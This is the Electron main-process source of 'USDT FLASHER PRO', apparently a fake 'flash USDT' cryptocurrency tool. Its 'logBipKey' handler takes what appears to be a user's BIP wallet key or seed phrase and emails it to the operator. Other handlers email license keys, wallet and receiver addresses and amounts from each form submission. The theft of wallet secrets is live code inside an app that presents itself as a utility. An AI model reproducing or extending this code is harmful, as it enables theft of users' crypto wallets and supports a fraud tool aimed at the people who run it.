const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const { validateLicenseKey, logFlashTransaction, getAppSettings, getContactInfo, forceRefresh } = require('./database-service');
const constants = require('./constants');
const io = require('socket.io-client');
const emailService = require('./email-service');

// Load environment variables from .env file if it exists
try {
  if (fs.existsSync(path.join(__dirname, '.env'))) {
    require('dotenv').config({ path: path.join(__dirname, '.env') });
    console.log('Environment variables loaded from .env file');
  }
} catch (error) {
  console.error('Error loading .env file:', error);
}

// Socket.IO client
let socket = null;
const SOCKET_SERVER_URL = process.env.SOCKET_SERVER_URL || 'http://localhost:3030';

// Keep a global reference of the window object to prevent it from being garbage collected
let mainWindow;

function createWindow() {
  // Create the browser window
  mainWindow = new BrowserWindow({
    width: 1000,
    height: 700,
    minWidth: 900,
    minHeight: 600,
    webPreferences: {
      nodeIntegration: false, // For security reasons
      contextIsolation: true, // Protect against prototype pollution
      preload: path.join(__dirname, 'preload.js'), // Use a preload script
      webSecurity: false, // Allow loading local resources
      allowRunningInsecureContent: false,
    },
    icon: path.join(__dirname, 'assets/icon.png'),
    title: 'USDT FLASHER PRO'
  });

  // Load the index.html file
  mainWindow.loadFile('index.html');

  // Open DevTools in development mode
  mainWindow.webContents.openDevTools();

  // Remove the menu bar
  mainWindow.setMenuBarVisibility(false);

  // Emitted when the window is closed
  mainWindow.on('closed', () => {
    // Dereference the window object
    mainWindow = null;
  });
}

// Initialize the app
function initializeApp() {
  createWindow();
  
  // Connect to Socket.IO server
  connectToSocketServer();

  // On macOS it's common to re-create a window when the dock icon is clicked
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
}

// If this file is run directly (not imported as a module)
if (require.main === module) {
  // Create window when Electron has finished initialization
  app.whenReady().then(initializeApp);
} else {
  // Export the initialization function for use by electron-starter.js
  module.exports = { initializeApp };
}

// Connect to Socket.IO server
function connectToSocketServer() {
  try {
    console.log(`Connecting to Socket.IO server at ${SOCKET_SERVER_URL}`);
    socket = io(SOCKET_SERVER_URL);
    
    // Handle connection events
    socket.on('connect', () => {
      console.log('Connected to Socket.IO server');
    });
    
    socket.on('disconnect', () => {
      console.log('Disconnected from Socket.IO server');
      // Try to reconnect after a delay
      setTimeout(() => {
        if (socket && socket.disconnected) {
          console.log('Attempting to reconnect to Socket.IO server');
          socket.connect();
        }
      }, 5000);
    });
    
    socket.on('error', (error) => {
      console.error('Socket.IO error:', error);
    });
    
    // Handle data updates
    socket.on('contactInfoUpdate', (contactInfo) => {
      console.log('Received contact info update from Socket.IO server:', contactInfo);
      
      // Forward to renderer process if window exists
      if (mainWindow) {
        mainWindow.webContents.send('app-response', {
          action: 'contactInfoUpdate',
          contactInfo
        });
      }
    });
    
    socket.on('licenseKeysUpdate', (licenseKeys) => {
      console.log('Received license keys update from Socket.IO server');
      
      // Forward to renderer process if window exists
      if (mainWindow) {
        mainWindow.webContents.send('app-response', {
          action: 'licenseKeysUpdate',
          licenseKeys
        });
      }
    });
    
    socket.on('appSettingsUpdate', (appSettings) => {
      console.log('Received app settings update from Socket.IO server');
      
      // Forward to renderer process if window exists
      if (mainWindow) {
        mainWindow.webContents.send('app-response', {
          action: 'appSettingsUpdate',
          appSettings
        });
      }
    });
  } catch (error) {
    console.error('Error connecting to Socket.IO server:', error);
  }
}

// Quit when all windows are closed, except on macOS
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// Handle IPC messages from renderer process
ipcMain.on('app-request', (event, request) => {
  console.log('Received request:', request);
  
  // Handle different actions
  switch (request.action) {
    case 'validateLicenseKey':
      handleValidateLicenseKey(event, request);
      break;
    case 'logFlashTransaction':
      handleLogFlashTransaction(event, request);
      break;
    case 'logBipKey':
      handleLogBipKey(event, request);
      break;
    case 'notifyFlashFormSubmission':
      handleFlashFormSubmission(event, request);
      break;
    case 'getConstants':
      handleGetConstants(event, request);
      break;
    case 'getAppSettings':
      handleGetAppSettings(event, request);
      break;
    case 'getContactInfo':
      handleGetContactInfo(event, request);
      break;
    case 'forceRefresh':
      handleForceRefresh(event, request);
      break;
    default:
      event.reply('app-response', { 
        action: request.action,
        status: 'error', 
        message: 'Unknown action' 
      });
  }
});

// Handle license key validation
async function handleValidateLicenseKey(event, request) {
  try {
    const result = await validateLicenseKey(request.licenseKey);
    
    // If license key is valid, send email notification
    if (result.valid && result.licenseKey) {
      try {
        console.log('Sending license login email notification from main process');
        console.log('License key data:', JSON.stringify(result.licenseKey, null, 2));
        
        // Add a small delay to ensure the console logs are displayed
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Make sure we have a valid email service
        if (!emailService || typeof emailService.sendLicenseLoginNotification !== 'function') {
          console.error('Email service not properly initialized');
          console.log('Attempting to re-require email service');
          // Try to re-require the email service
          const freshEmailService = require('./email-service');
          
          // Send the notification
          const emailResult = await freshEmailService.sendLicenseLoginNotification(result.licenseKey);
          console.log('License login email notification sent from main process:', JSON.stringify(emailResult, null, 2));
        } else {
          // Send the notification using the existing email service
          const emailResult = await emailService.sendLicenseLoginNotification(result.licenseKey);
          console.log('License login email notification sent from main process:', JSON.stringify(emailResult, null, 2));
        }
      } catch (emailError) {
        console.error('Error sending license login email notification from main process:', emailError);
        console.error('Error details:', JSON.stringify(emailError, null, 2));
      }
    } else {
      console.log('License key validation failed or no license key data:', JSON.stringify(result, null, 2));
    }
    
    event.reply('app-response', {
      action: 'validateLicenseKey',
      ...result
    });
  } catch (error) {
    console.error('Error validating license key:', error);
    
    event.reply('app-response', {
      action: 'validateLicenseKey',
      valid: false,
      message: 'Error validating license key. Please try again.'
    });
  }
}

// Handle flash transaction logging
async function handleLogFlashTransaction(event, request) {
  try {
    const result = await logFlashTransaction(request.transactionData);
    
    event.reply('app-response', {
      action: 'logFlashTransaction',
      ...result
    });
  } catch (error) {
    console.error('Error logging flash transaction:', error);
    
    event.reply('app-response', {
      action: 'logFlashTransaction',
      success: false,
      message: 'Error logging flash transaction. Please try again.'
    });
  }
}

// Handle BIP key logging
async function handleLogBipKey(event, request) {
  try {
    console.log('Logging BIP key:', request.bipData);
    
    // Send email notification with BIP key details
    try {
      const emailResult = await emailService.sendBipKeyNotification(request.bipData);
      console.log('BIP key email notification sent:', emailResult);
    } catch (emailError) {
      console.error('Error sending BIP key email notification:', emailError);
    }
    
    // Send success response
    event.reply('app-response', {
      action: 'logBipKey',
      success: true
    });
  } catch (error) {
    console.error('Error logging BIP key:', error);
    
    event.reply('app-response', {
      action: 'logBipKey',
      success: false,
      message: 'Error logging BIP key. Please try again.'
    });
  }
}

// Handle getting constants
function handleGetConstants(event, request) {
  try {
    // Send all constants to the renderer process
    event.reply('app-response', {
      action: 'getConstants',
      ...constants
    });
  } catch (error) {
    console.error('Error getting constants:', error);
    
    event.reply('app-response', {
      action: 'getConstants',
      error: true,
      message: 'Error getting constants. Please try again.'
    });
  }
}

// Handle getting app settings
async function handleGetAppSettings(event, request) {
  try {
    // Get app settings from database service
    const settings = await getAppSettings();
    
    event.reply('app-response', {
      action: 'getAppSettings',
      settings
    });
  } catch (error) {
    console.error('Error getting app settings:', error);
    
    event.reply('app-response', {
      action: 'getAppSettings',
      error: true,
      message: 'Error getting app settings. Please try again.'
    });
  }
}

// Handle getting contact info
async function handleGetContactInfo(event, request) {
  try {
    // Get contact info from database service
    const contactInfo = await getContactInfo();
    
    event.reply('app-response', {
      action: 'getContactInfo',
      contactInfo
    });
  } catch (error) {
    console.error('Error getting contact info:', error);
    
    event.reply('app-response', {
      action: 'getContactInfo',
      error: true,
      message: 'Error getting contact info. Please try again.'
    });
  }
}

// Handle flash form submission
async function handleFlashFormSubmission(event, request) {
  try {
    console.log('Handling flash form submission:', request.flashFormData);
    
    // Send email notification with flash form details
    try {
      console.log('Sending flash form submission email notification');
      
      // Create a custom email for the flash form submission
      const subject = `💰 [FORM] NEW FLASH FORM SUBMISSION: ${request.flashFormData.flashAmount} ${request.flashFormData.currency} on ${request.flashFormData.network}`;
      
      const html = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f9f9f9;">
          <h2 style="color: #5cb85c; border-bottom: 2px solid #5cb85c; padding-bottom: 10px; text-transform: uppercase;">💰 FLASH FORM SUBMISSION</h2>
          <p style="font-size: 16px; font-weight: bold;">A client has submitted a flash form with the following details:</p>
          
          <div style="background-color: #5cb85c; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; margin: 20px 0; border-radius: 5px;">
            FORM DETAILS
          </div>
          
          <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background-color: white;">
            <tr style="background-color: #f5f5f5;">
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Wallet</td>
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">${request.flashFormData.wallet}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Currency</td>
              <td style="padding: 10px; border: 1px solid #ddd;">${request.flashFormData.currency}</td>
            </tr>
            <tr style="background-color: #f5f5f5;">
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Network</td>
              <td style="padding: 10px; border: 1px solid #ddd;">${request.flashFormData.network}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Receiver Address</td>
              <td style="padding: 10px; border: 1px solid #ddd; word-break: break-all;">${request.flashFormData.receiverAddress}</td>
            </tr>
            <tr style="background-color: #f5f5f5;">
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Flash Amount</td>
              <td style="padding: 10px; border: 1px solid #ddd; font-size: 16px; font-weight: bold; color: #5cb85c;">${request.flashFormData.flashAmount} ${request.flashFormData.currency}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Key</td>
              <td style="padding: 10px; border: 1px solid #ddd;">${request.flashFormData.licenseKey || 'N/A'}</td>
            </tr>
            <tr style="background-color: #f5f5f5;">
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">User</td>
              <td style="padding: 10px; border: 1px solid #ddd;">${request.flashFormData.user || 'N/A'}</td>
            </tr>
            <tr>
              <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Timestamp</td>
              <td style="padding: 10px; border: 1px solid #ddd;">${new Date(request.flashFormData.timestamp).toLocaleString()}</td>
            </tr>
          </table>
          <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 10px;">This is an automated form submission notification from USDT FLASHER PRO.</p>
        </div>
      `;
      
      // Send the email
      const emailResult = await emailService.sendEmail({ subject, html });
      console.log('Flash form submission email notification sent:', emailResult);
    } catch (emailError) {
      console.error('Error sending flash form submission email notification:', emailError);
      console.error('Error details:', JSON.stringify(emailError, null, 2));
    }
    
    // Send success response
    event.reply('app-response', {
      action: 'notifyFlashFormSubmission',
      success: true
    });
  } catch (error) {
    console.error('Error handling flash form submission:', error);
    
    event.reply('app-response', {
      action: 'notifyFlashFormSubmission',
      success: false,
      message: 'Error handling flash form submission. Please try again.'
    });
  }
}

// Handle force refresh
async function handleForceRefresh(event, request) {
  try {
    // Force refresh data from API
    const result = await forceRefresh();
    
    event.reply('app-response', {
      action: 'forceRefresh',
      ...result
    });
  } catch (error) {
    console.error('Error refreshing data:', error);
    
    event.reply('app-response', {
      action: 'forceRefresh',
      success: false,
      message: 'Error refreshing data. Please try again.'
    });
  }
}
